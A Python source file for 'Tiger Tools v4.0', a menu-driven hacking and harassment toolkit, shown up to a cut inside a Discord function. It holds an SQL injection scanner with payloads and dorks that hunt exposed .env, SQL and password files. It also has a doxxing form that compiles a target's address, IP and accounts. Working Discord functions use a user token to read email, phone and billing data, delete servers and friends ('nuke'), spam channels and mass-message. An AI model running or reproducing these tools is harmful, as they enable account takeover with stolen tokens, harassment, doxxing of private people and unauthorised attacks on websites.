# -*- coding: utf-8 -*-
#!/usr/bin/env python3
# ================================================================
#   TIGER TOOLS v4.0  |  Full Multi-Tool Suite
#   Network · OSINT · Discord · Builder · Roblox · Gaming · Web
# ================================================================

import os,sys,json,socket,random,string,hashlib,platform
import time,re,subprocess,base64,shutil,struct,threading
from datetime import datetime

# fix windows unicode
if platform.system()=="Windows":
    import ctypes
    ctypes.windll.kernel32.SetConsoleOutputCP(65001)
    sys.stdout.reconfigure(encoding='utf-8') if hasattr(sys.stdout,'reconfigure') else None

def pip(*pkgs):
    for p in pkgs:
        subprocess.run([sys.executable,"-m","pip","install",p,"--quiet","--disable-pip-version-check"],check=False)

try: import requests
except: pip("requests"); import requests

try:
    from colorama import Fore,Back,Style,init as cinit; cinit(autoreset=True,strip=False)
except:
    pip("colorama"); from colorama import Fore,Back,Style,init as cinit; cinit(autoreset=True,strip=False)

R=Fore.RED;G=Fore.GREEN;Y=Fore.YELLOW;B=Fore.BLUE
M=Fore.MAGENTA;C=Fore.CYAN;W=Fore.WHITE
DIM=Style.DIM;BRT=Style.BRIGHT;RST=Style.RESET_ALL
OK=f"{G}[+]{RST}";ERR=f"{R}[-]{RST}";INF=f"{Y}[~]{RST}"
VERSION="4.0"

def clr(): os.system("cls" if platform.system()=="Windows" else "clear")
def pause(): input(f"\n{DIM}  [press enter]{RST}")
def save_out(name,content):
    os.makedirs("1-Output",exist_ok=True)
    p=os.path.join("1-Output",name)
    with open(p,"w",encoding="utf-8") as f: f.write(content)
    print(f"\n{OK} Saved -> {Y}{p}{RST}")
def jget(url,headers=None,timeout=6):
    try: r=requests.get(url,headers=headers,timeout=timeout); return r.json()
    except Exception as e: return {"error":str(e)}
def pkv(d,indent=0):
    pad="  "*indent
    for k,v in (d.items() if isinstance(d,dict) else []):
        if isinstance(v,dict): print(f"{pad}{C}{k}{RST}:"); pkv(v,indent+1)
        else: print(f"{pad}{Y}{str(k):<22}{RST} {W}{v}{RST}")

# ================================================================
# BANNER
# ================================================================
def banner_main():
    clr()
    print(f"""{R}{BRT}
  /$$$$$$$$ /$$$$$$  /$$$$$$  /$$$$$$$$ /$$$$$$$
 |__  $$__/|_  $$_/ /$$__  $$| $$_____/| $$__  $$
    | $$     | $$  | $$  \\__/| $$      | $$  \\ $$
    | $$     | $$  | $$ /$$$$| $$$$$   | $$$$$$$/
    | $$     | $$  | $$|_  $$| $$__/   | $$__  $$
    | $$     | $$  | $$  \\ $$| $$      | $$  \\ $$
    | $$    /$$$$$$|  $$$$$$/| $$$$$$$$| $$  | $$
    |__/   |______/ \\______/ |________/|__/  |__/

  /$$$$$$$$ /$$$$$$   /$$$$$$  /$$       /$$$$$$
 |__  $$__//$$__  $$ /$$__  $$| $$      /$$__  $$
    | $$  | $$  \\ $$| $$  \\ $$| $$     | $$  \\__/
    | $$  | $$  | $$| $$  | $$| $$     |  $$$$$$
    | $$  | $$  | $$| $$  | $$| $$      \\____  $$
    | $$  | $$  | $$| $$  | $$| $$      /$$  \\ $$
    | $$  |  $$$$$$/|  $$$$$$/| $$$$$$$$|  $$$$$$/
    |__/   \\______/  \\______/ |________/ \\______/
{RST}
{R}  =========================================================={RST}
  {DIM}v{VERSION}  Network / OSINT / Discord / Builder / Roblox / Web{RST}
{R}  =========================================================={RST}
""")

def banner_s(title):
    clr()
    w=58
    print(f"\n{R}  +{'='*w}+")
    print(f"  |  {BRT}{W}{title:<{w-2}}{RST}{R}|")
    print(f"  +{'='*w}+{RST}\n")

def menu_box(title,opts):
    banner_main()
    print(f"  {R}+--[ {W}{BRT}{title}{RST}{R} ]{'-'*(50-len(title))}+{RST}")
    for n,t in opts:
        b=f"{G}>>{RST}" if n!="0" else f"{R}<<{RST}"
        print(f"  {R}|{RST}  {b} {Y}[{n:<2}]{RST} {W}{t}{RST}")
    print(f"  {R}+{'-'*56}+{RST}\n")

# ================================================================
# 1 - NETWORK
# ================================================================
def net_menu():
    while True:
        opts=[("1","IP Lookup"),("2","Port Scanner"),("3","Pinger"),
              ("4","Website Scanner"),("5","SQL Vuln Scanner"),
              ("6","DNS Lookup"),("7","Subdomain Scanner"),
              ("8","Header Grabber"),("9","Traceroute"),
              ("10","Reverse IP Lookup"),("11","Website URL Scanner"),
              ("0","Back")]
        menu_box("NETWORK SCANNER",opts)
        c=input(f"  {R}>{RST} ").strip()
        if c=="1": net_ip_lookup()
        elif c=="2": net_port_scan()
        elif c=="3": net_pinger()
        elif c=="4": net_website_scan()
        elif c=="5": net_sql_scan()
        elif c=="6": net_dns()
        elif c=="7": net_subdomain()
        elif c=="8": net_headers()
        elif c=="9": net_traceroute()
        elif c=="10": net_reverse_ip()
        elif c=="11": net_url_scan()
        elif c=="0": break

def net_ip_lookup():
    banner_s("IP LOOKUP")
    ip=input(f"  {W}IP: {RST}").strip()
    d=jget(f"http://ip-api.com/json/{ip}?fields=66846719")
    print(); pkv(d)
    save_out(f"ip_{ip}.txt",json.dumps(d,indent=2)); pause()

def net_port_scan():
    banner_s("PORT SCANNER")
    host=input(f"  {W}Host/IP: {RST}").strip()
    rng=input(f"  {W}Range (e.g. 1-1024): {RST}").strip()
    try: p1,p2=map(int,rng.split("-"))
    except: print(f"{ERR} Bad range."); pause(); return
    print(f"\n{INF} Scanning {Y}{host}{RST} {p1}->{p2}...\n")
    open_p=[]
    for port in range(p1,p2+1):
        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.settimeout(0.35)
        if s.connect_ex((host,port))==0:
            try: svc=socket.getservbyport(port)
            except: svc="?"
            print(f"  {G}[OPEN]{RST}  {BRT}{port}/tcp{RST}  {DIM}{svc}{RST}"); open_p.append(port)
        s.close()
    print(f"\n{OK} {G}{len(open_p)}{RST} open ports.")
    save_out(f"ports_{host}.txt",f"Host:{host}\nOpen:{open_p}"); pause()

def net_pinger():
    banner_s("PINGER")
    host=input(f"  {W}Host/IP: {RST}").strip()
    param="-n" if platform.system()=="Windows" else "-c"
    res=subprocess.run(["ping",param,"4",host],capture_output=True,text=True)
    print(res.stdout); save_out(f"ping_{host}.txt",res.stdout); pause()

def net_website_scan():
    banner_s("WEBSITE SCANNER")
    url=input(f"  {W}URL: {RST}").strip()
    try:
        r=requests.get(url,timeout=10)
        rows=[("Status",str(r.status_code)),("Server",r.headers.get("Server","N/A")),
              ("X-Powered-By",r.headers.get("X-Powered-By","N/A")),
              ("Content-Type",r.headers.get("Content-Type","N/A")),
              ("Length",r.headers.get("Content-Length",str(len(r.content)))),
              ("Final URL",r.url),("Cookies",str(dict(r.cookies)))]
        print()
        for k,v in rows: print(f"  {Y}{k:<18}{RST} {W}{v}{RST}")
        save_out(f"webscan_{url[:30].replace('/','_')}.txt","\n".join(f"{k}:{v}" for k,v in rows))
    except Exception as e: print(f"{ERR} {e}")
    pause()

def net_url_scan():
    banner_s("WEBSITE URL SCANNER")
    url=input(f"  {W}URL: {RST}").strip()
    try:
        r=requests.get(url,timeout=10)
        links=re.findall(r'href=["\']([^"\']+)["\']',r.text)
        scripts=re.findall(r'src=["\']([^"\']+)["\']',r.text)
        forms=re.findall(r'<form[^>]*action=["\']([^"\']*)["\']',r.text)
        print(f"\n  {Y}Links found   {RST}: {W}{len(links)}{RST}")
        print(f"  {Y}Scripts found {RST}: {W}{len(scripts)}{RST}")
        print(f"  {Y}Forms found   {RST}: {W}{len(forms)}{RST}\n")
        for l in links[:20]: print(f"  {G}[LINK]{RST}   {DIM}{l[:80]}{RST}")
        for s in scripts[:10]: print(f"  {C}[SCRIPT]{RST} {DIM}{s[:80]}{RST}")
        for f in forms: print(f"  {R}[FORM]{RST}   {DIM}{f[:80]}{RST}")
        out="\n".join(links+scripts+forms)
        save_out(f"urlscan_{url[:30].replace('/','_')}.txt",out)
    except Exception as e: print(f"{ERR} {e}")
    pause()

def net_sql_scan():
    banner_s("SQL VULNERABILITY SCANNER")
    url=input(f"  {W}URL with param: {RST}").strip()
    payloads=["'",'"',"' OR '1'='1","' OR 1=1--","1 UNION SELECT NULL--","' OR SLEEP(3)--","1' ORDER BY 1--"]
    errors=["sql syntax","mysql_fetch","unclosed quotation","syntax error","ORA-","Microsoft OLE DB","ODBC SQL"]
    print(f"\n{INF} Testing {len(payloads)} payloads...\n"); vuln=False
    for pl in payloads:
        try:
            r=requests.get(url+pl,timeout=5)
            hit=any(e.lower() in r.text.lower() for e in errors)
            tag=f"{G}[VULN]{RST}" if hit else f"{DIM}[SAFE]{RST}"
            if hit: vuln=True
            print(f"  {tag}  {pl}")
        except Exception as e: print(f"  {R}[ERR]{RST}  {e}")
    print(f"\n{INF} {'POSSIBLY VULNERABLE' if vuln else 'No obvious SQL errors'}"); pause()

def net_dns():
    banner_s("DNS LOOKUP")
    domain=input(f"  {W}Domain: {RST}").strip()
    for rtype in ["A","AAAA","MX","NS","TXT","CNAME"]:
        try:
            cmd=["nslookup",f"-type={rtype}",domain] if platform.system()=="Windows" else ["dig","+short",rtype,domain]
            res=subprocess.run(cmd,capture_output=True,text=True,timeout=5)
            out=res.stdout.strip()
            if out: print(f"\n  {Y}{rtype}{RST}:\n  {W}{out}{RST}")
        except: pass
    pause()

def net_subdomain():
    banner_s("SUBDOMAIN SCANNER")
    domain=input(f"  {W}Domain: {RST}").strip()
    wordlist=["www","mail","ftp","admin","api","dev","test","staging","blog","shop",
              "store","app","portal","vpn","remote","cdn","static","media","beta",
              "old","new","secure","login","auth","panel","cpanel","webmail","ns1","ns2","m"]
    print(f"\n{INF} Scanning {len(wordlist)} subdomains...\n"); found=[]
    for sub in wordlist:
        full=f"{sub}.{domain}"
        try:
            ip=socket.gethostbyname(full)
            print(f"  {G}[FOUND]{RST}  {BRT}{full}{RST}  {DIM}-> {ip}{RST}"); found.append(f"{full} -> {ip}")
        except: print(f"  {DIM}[MISS]   {full}{RST}")
    save_out(f"subdomains_{domain}.txt","\n".join(found)); pause()

def net_headers():
    banner_s("HEADER GRABBER")
    url=input(f"  {W}URL: {RST}").strip()
    try:
        r=requests.get(url,timeout=8); print()
        for k,v in r.headers.items(): print(f"  {Y}{k:<30}{RST} {W}{v}{RST}")
        save_out(f"headers_{url[:30].replace('/','_')}.txt","\n".join(f"{k}: {v}" for k,v in r.headers.items()))
    except Exception as e: print(f"{ERR} {e}")
    pause()

def net_traceroute():
    banner_s("TRACEROUTE")
    host=input(f"  {W}Host/IP: {RST}").strip()
    cmd=["tracert",host] if platform.system()=="Windows" else ["traceroute",host]
    try:
        res=subprocess.run(cmd,capture_output=True,text=True,timeout=30)
        print(res.stdout); save_out(f"traceroute_{host}.txt",res.stdout)
    except Exception as e: print(f"{ERR} {e}")
    pause()

def net_reverse_ip():
    banner_s("REVERSE IP LOOKUP")
    ip=input(f"  {W}IP: {RST}").strip()
    try:
        host=socket.gethostbyaddr(ip)
        print(f"\n  {Y}Hostname {RST}: {W}{host[0]}{RST}")
    except Exception as e: print(f"{ERR} {e}")
    d=jget(f"http://ip-api.com/json/{ip}"); pkv(d); pause()

# ================================================================
# 2 - OSINT
# ================================================================
def osint_menu():
    while True:
        opts=[("1","Username Tracker"),("2","IP Lookup"),("3","Email Tracker"),
              ("4","Email Lookup"),("5","Phone Number Lookup"),
              ("6","Google Dorking"),("7","Image EXIF"),
              ("8","D0x Create"),("9","D0x Tracker"),
              ("10","Instagram Account"),("11","Breach Check"),
              ("12","Pastebin Search"),("0","Back")]
        menu_box("OSINT",opts)
        c=input(f"  {R}>{RST} ").strip()
        if c=="1": osint_username()
        elif c=="2": net_ip_lookup()
        elif c=="3": osint_email_tracker()
        elif c=="4": osint_email_lookup()
        elif c=="5": osint_phone()
        elif c=="6": osint_dork()
        elif c=="7": osint_exif()
        elif c=="8": osint_dox()
        elif c=="9": osint_dox_tracker()
        elif c=="10": osint_instagram()
        elif c=="11": osint_breach()
        elif c=="12": osint_pastebin()
        elif c=="0": break

def osint_username():
    banner_s("USERNAME TRACKER")
    user=input(f"  {W}Username: {RST}").strip()
    sites={"GitHub":f"https://github.com/{user}","Twitter/X":f"https://x.com/{user}",
           "Instagram":f"https://www.instagram.com/{user}/","Reddit":f"https://www.reddit.com/user/{user}",
           "TikTok":f"https://www.tiktok.com/@{user}","Twitch":f"https://www.twitch.tv/{user}",
           "YouTube":f"https://www.youtube.com/@{user}","Telegram":f"https://t.me/{user}",
           "Steam":f"https://steamcommunity.com/id/{user}","SoundCloud":f"https://soundcloud.com/{user}",
           "GitLab":f"https://gitlab.com/{user}","Replit":f"https://replit.com/@{user}",
           "Pastebin":f"https://pastebin.com/u/{user}","Pinterest":f"https://www.pinterest.com/{user}/",
           "DeviantArt":f"https://www.deviantart.com/{user}",
           "Roblox":f"https://www.roblox.com/user.aspx?username={user}",
           "Keybase":f"https://keybase.io/{user}","Spotify":f"https://open.spotify.com/user/{user}",
           "Linktree":f"https://linktr.ee/{user}","Snapchat":f"https://www.snapchat.com/add/{user}",
           "Facebook":f"https://www.facebook.com/{user}","Kick":f"https://kick.com/{user}",
           "Chess.com":f"https://www.chess.com/member/{user}","Minecraft":f"https://namemc.com/profile/{user}"}
    print(); found=[]
    for site,url in sites.items():
        try:
            r=requests.get(url,timeout=4,allow_redirects=True,headers={"User-Agent":"Mozilla/5.0"})
            ok=r.status_code==200
            tag=f"{G}[FOUND]{RST}" if ok else f"{R}[MISS] {RST}"
            print(f"  {tag}  {Y}{site:<14}{RST}  {DIM}{url}{RST}")
            if ok: found.append(f"[FOUND] {site}: {url}")
        except: print(f"  {DIM}[ERR]   {site}{RST}")
    save_out(f"username_{user}.txt","\n".join(found)); pause()

def osint_email_tracker():
    banner_s("EMAIL TRACKER")
    email=input(f"  {W}Email: {RST}").strip()
    domain=email.split("@")[-1] if "@" in email else ""
    print(f"\n  {Y}Email  {RST}: {W}{email}{RST}\n  {Y}Domain {RST}: {W}{domain}{RST}")
    try: ip=socket.gethostbyname(domain); print(f"  {Y}DNS    {RST}: {G}{ip}{RST}")
    except: print(f"  {Y}DNS    {RST}: {R}unresolved{RST}")
    print(f"\n  {Y}Profile search links:{RST}")
    searches=[f"https://www.google.com/search?q={email}",
              f"https://www.google.com/search?q=site:linkedin.com+{email}",
              f"https://www.google.com/search?q=site:facebook.com+{email}"]
    for s in searches: print(f"  {G}->{RST} {DIM}{s}{RST}")
    save_out(f"email_tracker_{email.replace('@','_at_')}.txt",f"Email:{email}\nDomain:{domain}"); pause()

def osint_email_lookup():
    banner_s("EMAIL LOOKUP")
    email=input(f"  {W}Email: {RST}").strip()
    domain=email.split("@")[-1] if "@" in email else ""
    print(f"\n  {Y}Email       {RST}: {W}{email}{RST}")
    print(f"  {Y}Domain      {RST}: {W}{domain}{RST}")
    try:
        import socket as sk
        mx=sk.gethostbyname(f"mail.{domain}")
        print(f"  {Y}Mail Server {RST}: {G}{mx}{RST}")
    except: print(f"  {Y}Mail Server {RST}: {R}not found{RST}")
    print(f"\n  {Y}Lookup links:{RST}")
    print(f"  {G}->{RST} {DIM}https://haveibeenpwned.com/account/{email}{RST}")
    print(f"  {G}->{RST} {DIM}https://hunter.io/email-verifier/{email}{RST}")
    print(f"  {G}->{RST} {DIM}https://dehashed.com/search?query={email}{RST}")
    save_out(f"email_lookup_{email.replace('@','_at_')}.txt",f"Email:{email}\nDomain:{domain}"); pause()

def osint_phone():
    banner_s("PHONE NUMBER LOOKUP")
    phone=input(f"  {W}Phone (+cc): {RST}").strip()
    codes={"1":"USA/Canada","33":"France","44":"UK","49":"Germany","34":"Spain",
           "39":"Italy","7":"Russia","86":"China","91":"India","55":"Brazil",
           "81":"Japan","82":"South Korea","31":"Netherlands","32":"Belgium",
           "41":"Switzerland","46":"Sweden","47":"Norway","48":"Poland",
           "351":"Portugal","380":"Ukraine","90":"Turkey","966":"Saudi Arabia",
           "971":"UAE","972":"Israel","234":"Nigeria","52":"Mexico","54":"Argentina",
           "57":"Colombia","56":"Chile","20":"Egypt","27":"South Africa","212":"Morocco"}
    raw=phone.lstrip("+"); cc="?"
    for code,name in sorted(codes.items(),key=lambda x:-len(x[0])):
        if raw.startswith(code): cc=f"+{code} ({name})"; break
    print(f"\n  {Y}Number  {RST}: {W}{phone}{RST}\n  {Y}Country {RST}: {W}{cc}{RST}\n  {Y}Digits  {RST}: {W}{len(raw)}{RST}")
    print(f"\n  {Y}Lookup:{RST}\n  {G}->{RST} {DIM}https://www.truecaller.com/search/xx/{raw}{RST}")
    save_out(f"phone_{raw}.txt",f"Number:{phone}\nCountry:{cc}"); pause()

def osint_dork():
    banner_s("GOOGLE DORKING")
    target=input(f"  {W}Target: {RST}").strip()
    dorks=[f'site:{target}',f'site:{target} filetype:pdf',f'site:{target} filetype:sql',
           f'site:{target} filetype:env',f'site:{target} filetype:log',
           f'site:{target} intitle:"index of"',f'site:{target} inurl:admin',
           f'site:{target} inurl:login',f'site:{target} intext:"password"',
           f'site:{target} ext:bak',f'site:{target} inurl:config',
           f'"{target}" filetype:xls',f'intext:"{target}" site:pastebin.com',
           f'site:{target} inurl:backup',f'site:{target} inurl:wp-admin',
           f'site:{target} ext:php inurl:?id=',f'"{target}" ext:doc OR ext:docx']
    print(); lines=[]
    for d in dorks:
        url=f"https://www.google.com/search?q={d.replace(' ','+')}"
        print(f"  {G}->{RST} {DIM}{d}{RST}\n     {Y}{url}{RST}\n"); lines.append(d+"\n"+url)
    save_out(f"dorks_{target}.txt","\n\n".join(lines)); pause()

def osint_exif():
    banner_s("IMAGE EXIF DATA")
    try: from PIL import Image; from PIL.ExifTags import TAGS
    except: pip("Pillow"); from PIL import Image; from PIL.ExifTags import TAGS
    path=input(f"  {W}Image path: {RST}").strip()
    try:
        img=Image.open(path); exif=img._getexif()
        if not exif: print(f"\n{INF} No EXIF data.")
        else:
            print(); out=[]
            for tid,val in exif.items():
                tag=TAGS.get(tid,tid); print(f"  {Y}{str(tag):<30}{RST} {W}{val}{RST}"); out.append(f"{tag}: {val}")
            save_out(f"exif_{os.path.basename(path)}.txt","\n".join(str(x) for x in out))
    except Exception as e: print(f"{ERR} {e}")
    pause()

def osint_dox():
    banner_s("D0X CREATE")
    print(f"  {DIM}Leave blank to skip fields.{RST}\n")
    fields=[("Full Name","name"),("Age","age"),("Email","email"),("Phone","phone"),
            ("Address","address"),("City","city"),("Country","country"),("IP","ip"),
            ("Discord","discord"),("Roblox","roblox"),("Instagram","instagram"),
            ("Snapchat","snap"),("Steam","steam"),("Social Links","socials"),("Notes","notes")]
    data={}
    for label,key in fields:
        val=input(f"  {Y}{label:<15}{RST}: ").strip()
        if val: data[key]=val
    ts=datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    out=f"{'='*40}\n  D0X FILE -- {ts}\n{'='*40}\n"
    for k,v in data.items(): out+=f"\n  {k.upper()}: {v}"
    print(f"\n{out}")
    save_out(f"dox_{data.get('name','unknown').replace(' ','_')}.txt",out); pause()

def osint_dox_tracker():
    banner_s("D0X TRACKER")
    target=input(f"  {W}Target name or username: {RST}").strip()
    searches=[
        f"https://www.google.com/search?q={target}",
        f"https://www.google.com/search?q={target}+discord",
        f"https://www.google.com/search?q={target}+instagram",
        f"https://www.google.com/search?q={target}+steam",
        f"https://www.google.com/search?q={target}+roblox",
        f"https://www.google.com/search?q=site:pastebin.com+{target}",
        f"https://twitter.com/search?q={target}",
        f"https://www.tiktok.com/search?q={target}",
    ]
    print(f"\n  {INF} D0x tracking links for: {Y}{target}{RST}\n")
    for s in searches: print(f"  {G}->{RST} {DIM}{s}{RST}")
    save_out(f"dox_tracker_{target}.txt","\n".join(searches)); pause()

def osint_instagram():
    banner_s("INSTAGRAM ACCOUNT")
    user=input(f"  {W}Username: {RST}").strip()
    try:
        r=requests.get(f"https://www.instagram.com/{user}/?__a=1&__d=dis",
                       headers={"User-Agent":"Mozilla/5.0"},timeout=8)
        if r.status_code==200:
            try:
                d=r.json()
                u=d.get("graphql",{}).get("user",{})
                print(f"\n  {Y}Username    {RST}: {W}{u.get('username','?')}{RST}")
                print(f"  {Y}Full Name   {RST}: {W}{u.get('full_name','?')}{RST}")
                print(f"  {Y}Bio         {RST}: {W}{u.get('biography','?')[:80]}{RST}")
                print(f"  {Y}Followers   {RST}: {W}{u.get('edge_followed_by',{}).get('count','?')}{RST}")
                print(f"  {Y}Following   {RST}: {W}{u.get('edge_follow',{}).get('count','?')}{RST}")
                print(f"  {Y}Posts       {RST}: {W}{u.get('edge_owner_to_timeline_media',{}).get('count','?')}{RST}")
                print(f"  {Y}Private     {RST}: {W}{u.get('is_private','?')}{RST}")
                print(f"  {Y}Verified    {RST}: {W}{u.get('is_verified','?')}{RST}")
            except:
                print(f"\n  {Y}Profile URL {RST}: {W}https://www.instagram.com/{user}/{RST}")
                print(f"  {INF} API blocked -- use browser to view")
        else:
            print(f"\n{ERR} User not found or blocked. ({r.status_code})")
    except Exception as e: print(f"{ERR} {e}")
    pause()

def osint_breach():
    banner_s("BREACH CHECK")
    email=input(f"  {W}Email: {RST}").strip()
    print(f"\n  {Y}Breach check links for: {W}{email}{RST}\n")
    print(f"  {G}->{RST} HaveIBeenPwned : {DIM}https://haveibeenpwned.com/account/{email}{RST}")
    print(f"  {G}->{RST} DeHashed       : {DIM}https://dehashed.com/search?query={email}{RST}")
    print(f"  {G}->{RST} LeakCheck      : {DIM}https://leakcheck.io/?query={email}{RST}")
    print(f"  {G}->{RST} Snusbase       : {DIM}https://snusbase.com/{RST}")
    print(f"  {G}->{RST} IntelX         : {DIM}https://intelx.io/?s={email}{RST}")
    pause()

def osint_pastebin():
    banner_s("PASTEBIN SEARCH")
    query=input(f"  {W}Query: {RST}").strip()
    urls=[f"https://www.google.com/search?q=site:pastebin.com+{query.replace(' ','+')}",
          f"https://pastebin.com/search?q={query.replace(' ','+')}",
          f"https://www.google.com/search?q=site:ghostbin.com+{query.replace(' ','+')}"]
    print(f"\n  {INF} Pastebin search: {Y}{query}{RST}\n")
    for u in urls: print(f"  {G}->{RST} {DIM}{u}{RST}")
    save_out(f"pastebin_{query[:20]}.txt","\n".join(urls)); pause()

# ================================================================
# 3 - DISCORD
# ================================================================
def discord_menu():
    while True:
        opts=[("1","Token Info"),("2","Token Nuker (Full)"),("3","Token Spammer"),
              ("4","Token Joiner"),("5","Token Leaver"),("6","Token Status Changer"),
              ("7","Token Delete Friends"),("8","Token Block Friends"),
              ("9","Token Mass DM"),("10","Token Delete DM"),
              ("11","Token Server Raid"),("12","Token Generator"),
              ("13","Webhook Info"),("14","Webhook Delete"),
              ("15","Webhook Spammer"),("16","Webhook Generator"),
              ("17","Server Nuker (Bot)"),("18","Server Info"),
              ("19","Nitro Generator"),("20","Friend Spammer"),
              ("21","Channel Spammer"),("22","Reaction Spammer"),
              ("23","Guild List"),("24","Friend List"),
              ("0","Back")]
        menu_box("DISCORD TOOLS",opts)
        c=input(f"  {R}>{RST} ").strip()
        if c=="1": disc_token_info()
        elif c=="2": disc_token_nuker()
        elif c=="3": disc_token_spammer()
        elif c=="4": disc_token_joiner()
        elif c=="5": disc_token_leaver()
        elif c=="6": disc_status_changer()
        elif c=="7": disc_delete_friends()
        elif c=="8": disc_block_friends()
        elif c=="9": disc_mass_dm()
        elif c=="10": disc_delete_dm()
        elif c=="11": disc_server_raid()
        elif c=="12": disc_token_gen()
        elif c=="13": disc_webhook_info()
        elif c=="14": disc_webhook_delete()
        elif c=="15": disc_webhook_spammer()
        elif c=="16": disc_webhook_gen()
        elif c=="17": disc_bot_nuker()
        elif c=="18": disc_server_info()
        elif c=="19": disc_nitro_gen()
        elif c=="20": disc_friend_spammer()
        elif c=="21": disc_channel_spammer()
        elif c=="22": disc_reaction_spammer()
        elif c=="23": disc_guilds()
        elif c=="24": disc_friends()
        elif c=="0": break

def _dh(token):
    return {"Authorization":token,"Content-Type":"application/json",
            "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}

def disc_token_info():
    banner_s("TOKEN INFO")
    token=input(f"  {W}Token: {RST}").strip()
    r=requests.get("https://discord.com/api/v9/users/@me",headers=_dh(token))
    if r.status_code==200:
        d=r.json()
        billing=requests.get("https://discord.com/api/v9/users/@me/billing/payment-sources",headers=_dh(token)).json()
        guilds=requests.get("https://discord.com/api/v9/users/@me/guilds",headers=_dh(token)).json()
        nitro_map={0:"None",1:"Nitro Classic",2:"Nitro",3:"Nitro Basic"}
        print(f"\n  {Y}Username {RST}: {W}{d.get('username')}#{d.get('discriminator','0')}{RST}")
        print(f"  {Y}ID       {RST}: {W}{d.get('id')}{RST}")
        print(f"  {Y}Email    {RST}: {W}{d.get('email','N/A')}{RST}")
        print(f"  {Y}Phone    {RST}: {W}{d.get('phone','N/A')}{RST}")
        print(f"  {Y}Verified {RST}: {W}{d.get('verified')}{RST}")
        print(f"  {Y}MFA      {RST}: {W}{d.get('mfa_enabled')}{RST}")
        print(f"  {Y}Nitro    {RST}: {W}{nitro_map.get(d.get('premium_type',0),'?')}{RST}")
        print(f"  {Y}Guilds   {RST}: {W}{len(guilds) if isinstance(guilds,list) else '?'}{RST}")
        print(f"  {Y}Billing  {RST}: {W}{len(billing) if isinstance(billing,list) else 0} method(s){RST}")
        save_out(f"disc_{d.get('id')}.txt",json.dumps({"user":d,"billing":billing},indent=2))
    else: print(f"\n{ERR} Invalid token. ({r.status_code})")
    pause()

def disc_token_nuker():
    banner_s("TOKEN NUKER -- FULL")
    token=input(f"  {W}Token: {RST}").strip(); h=_dh(token)
    print(f"\n  {Y}[1]{RST} Leave all servers")
    print(f"  {Y}[2]{RST} Delete owned servers")
    print(f"  {Y}[3]{RST} Delete all friends")
    print(f"  {Y}[4]{RST} FULL NUKE (all of the above)")
    mode=input(f"\n  {W}Mode: {RST}").strip()
    if input(f"\n  {R}[!]{RST} Type {BRT}NUKE{RST} to confirm: ")!="NUKE":
        print(f"{INF} Aborted."); pause(); return
    guilds=requests.get("https://discord.com/api/v9/users/@me/guilds",headers=h).json()
    if not isinstance(guilds,list): print(f"{ERR} Invalid token."); pause(); return
    if mode in ["1","4"]:
        for g in guilds:
            if not g.get("owner"):
                r=requests.delete(f"https://discord.com/api/v9/users/@me/guilds/{g['id']}",headers=h)
                print(f"  {Y}[LEAVE]{RST} {g['name']} ({r.status_code})"); time.sleep(0.3)
    if mode in ["2","4"]:
        for g in guilds:
            if g.get("owner"):
                r=requests.delete(f"https://discord.com/api/v9/guilds/{g['id']}",headers=h)
                print(f"  {R}[DEL]{RST}   {g['name']} ({r.status_code})"); time.sleep(0.3)
    if mode in ["3","4"]:
        friends=requests.get("https://discord.com/api/v9/users/@me/relationships",headers=h).json()
        if isinstance(friends,list):
            for f in friends:
                r=requests.delete(f"https://discord.com/api/v9/users/@me/relationships/{f['id']}",headers=h)
                print(f"  {R}[DEL FRIEND]{RST} {f.get('user',{}).get('username','?')} ({r.status_code})"); time.sleep(0.3)
    print(f"\n{OK} Nuke complete."); pause()

def disc_token_spammer():
    banner_s("TOKEN SPAMMER")
    token=input(f"  {W}Token: {RST}").strip()
    channel=input(f"  {W}Channel ID: {RST}").strip()
    message=input(f"  {W}Message: {RST}").strip()
    count=int(input(f"  {W}Count: {RST}").strip() or "10")
    delay=float(input(f"  {W}Delay (s): {RST}").strip() or "0.5")
    h=_dh(token); print()
    for i in range(1,count+1):
        r=requests.post(f"https://discord.com/api/v9/channels/{channel}/messages",headers=h,json={"content":message})
        col=G if r.status_code==200 else R; print(f"  {col}[{i}/{count}]{RST}  {r.status_code}"); time.sleep(delay)
    pause()

def disc_token_joiner():
    banner_s("TOKEN JOINER")
    token=input(f"  {W}Token: {RST}").strip()
    invite=input(f"  {W}Invite code (e.g. discord.gg/CODE -> CODE): {RST}").strip().split("/")[-1]
    r=requests.post(f"https://discord.com/api/v9/invites/{invite}",headers=_dh(token),json={})
    if r.status_code==200: print(f"\n{OK} Joined server: {G}{r.json().get('guild',{}).get('name','?')}{RST}")
    else: print(f"\n{ERR} Failed. ({r.status_code}) {r.text[:200]}")
    pause()

def disc_token_leaver():
    banner_s("TOKEN LEAVER")
    token=input(f"  {W}Token: {RST}").strip()
    gid=input(f"  {W}Server ID to leave: {RST}").strip()
    r=requests.delete(f"https://discord.com/api/v9/users/@me/guilds/{gid}",headers=_dh(token))
    print(f"\n{OK if r.status_code==204 else ERR} {r.status_code}"); pause()

def disc_status_changer():
    banner_s("TOKEN STATUS CHANGER")
    token=input(f"  {W}Token: {RST}").strip()
    print(f"  {Y}[1]{RST} online  {Y}[2]{RST} idle  {Y}[3]{RST} dnd  {Y}[4]{RST} invisible")
    mode=input(f"  {W}Status: {RST}").strip()
    status_map={"1":"online","2":"idle","3":"dnd","4":"invisible"}
    status=status_map.get(mode,"online")
    custom=input(f"  {W}Custom status text (blank=none): {RST}").strip()
    payload={"status":status}
    if custom: payload["custom_status"]={"text":custom}
    r=requests.patch("https://discord.com/api/v9/users/@me/settings",headers=_dh(token),json=payload)
    print(f"\n{OK if r.status_code==200 else ERR} Status set to {status} ({r.status_code})"); pause()

def disc_delete_friends():
    banner_s("TOKEN DELETE FRIENDS")
    token=input(f"  {W}Token: {RST}").strip(); h=_dh(token)
    friends=requests.get("https://discord.com/api/v9/users/@me/relationships",headers=h).json()
    if not isinstance(friends,list): print(f"{ERR} Invalid."); pause(); return
    print(f"{OK} Found {len(friends)} relationships.")
    if input(f"  {R}[!]{RST} Type {BRT}CONFIRM{RST}: ")!="CONFIRM": pause(); return
    for f in friends:
        r=requests.delete(f"https://discord.com/api/v9/users/@me/relationships/{f['id']}",headers=h)
        print(f"  {R}[DEL]{RST} {f.get('user',{}).get('username','?')} ({r.status_code})"); time.sleep(0.3)
    pause()

def disc_block_friends():
    banner_s("TOKEN BLOCK FRIENDS")
    token=input(f"  {W}Token: {RST}").strip(); h=_dh(token)
